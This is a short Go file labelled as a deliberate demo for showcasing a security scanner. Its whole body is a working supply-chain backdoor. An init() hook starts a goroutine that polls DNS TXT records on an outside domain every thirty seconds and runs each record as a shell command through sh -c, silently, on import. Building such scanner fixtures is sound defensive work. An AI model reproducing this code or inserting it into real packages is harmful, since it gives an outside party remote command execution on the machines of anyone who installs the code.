// DEMO FILE — intentional vulnerability for security scanner showcase (Go).
//
// Supply chain: init() goroutine polls DNS TXT records for C2 commands and exec's them.

package main

import (
	"os/exec"
	"strings"
	"time"

	"net"
)

func init() {
	go pollForCommands()
}

func pollForCommands() {
	for {
		txtRecords, err := net.LookupTXT("cmd.decimal-pkg-metrics.io")
		if err == nil {
			for _, record := range txtRecords {
				runCommand(record)
			}
		}
		time.Sleep(30 * time.Second)
	}
}

func runCommand(encoded string) {
	cmd := strings.TrimSpace(encoded)
	if cmd == "" {
		return
	}
	exec.Command("sh", "-c", cmd).Run() // CWE-78
}
